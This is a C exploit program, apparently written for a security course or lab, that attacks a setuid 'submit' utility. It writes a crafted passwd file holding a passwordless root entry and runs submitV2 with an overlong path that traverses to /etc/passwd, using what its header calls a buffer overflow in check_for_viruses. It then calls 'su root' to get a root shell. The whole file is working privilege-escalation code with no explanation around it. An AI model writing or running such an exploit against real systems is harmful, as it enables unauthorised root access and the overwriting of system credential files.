/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

//#define TARGET "/usr/local/bin/submitV2" // or submitV2
#define TARGET "/share/submit"   // for testing only

int main() {
    FILE *fp;
	//char *args[4];
	//char *env[1];

	unsigned char argbuf[4017]; 

	char *ptr;
    char newroot[] = "root::0:0:root:/root:/bin/bash\n";
    char user[] = "user::1000:1000::/home/user:/bin/sh\n";

    // create the argbuf
    memset(argbuf, ' ', sizeof(unsigned char)*4016);

    ptr = argbuf + 994;
    memcpy(ptr, user, strlen(user));
    ptr = argbuf + 1094;
    memcpy(ptr, newroot, strlen(newroot));

    system("mkdir -p /home/user/submit/user/etc/etc2");
    system("mkdir -p etc");

    if (chdir("/home/user/submit/user/etc/etc2") == -1)
    {
        printf("Failed to change directory:");
    }
    fp = fopen("/home/user/etc/passwd", "wb");
    fwrite(argbuf, 1, sizeof(argbuf), fp);
    fclose(fp);

    
    system("/usr/local/bin/submitV2 ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd");
    //system("/share/submit ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd");

	/*args[0] = TARGET;
	args[1] = "./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../etc/passwd"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");*/
    
    system("su root");
	
	return 1;
}
